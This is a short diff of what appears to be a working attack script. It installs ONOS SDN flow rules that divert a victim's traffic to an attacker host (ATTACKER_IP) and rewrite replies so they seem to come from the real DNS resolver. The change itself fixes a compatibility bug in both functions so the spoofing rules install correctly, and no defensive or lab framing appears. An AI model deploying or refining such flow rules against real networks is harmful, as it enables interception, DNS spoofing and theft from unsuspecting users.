@@ -94,7 +94,9 @@ def outbound_flow(device, attacker_mac, attacker_port):
         "deviceId": device,
         "treatment": {"instructions": [
             {"type": "L2MODIFICATION", "subtype": "ETH_DST", "mac": attacker_mac},
-            {"type": "L3MODIFICATION", "subtype": "IPV4_DST", "ip": ATTACKER_IP + "/32"},
+            # ONOS 2.7 wants a bare host address in a set-field action (no /32);
+            # the /32 prefix is valid only in the match selector below.
+            {"type": "L3MODIFICATION", "subtype": "IPV4_DST", "ip": ATTACKER_IP},
             {"type": "OUTPUT", "port": attacker_port},
         ]},
         "selector": {"criteria": [
@@ -112,7 +114,8 @@ def return_flow(device, victim_port):
         "priority": PRIORITY, "timeout": 0, "isPermanent": True,
         "deviceId": device,
         "treatment": {"instructions": [
-            {"type": "L3MODIFICATION", "subtype": "IPV4_SRC", "ip": REAL_RESOLVER_IP + "/32"},
+            # bare host address (no /32) — see note in outbound_flow().
+            {"type": "L3MODIFICATION", "subtype": "IPV4_SRC", "ip": REAL_RESOLVER_IP},
             {"type": "OUTPUT", "port": victim_port},
         ]},
         "selector": {"criteria": [
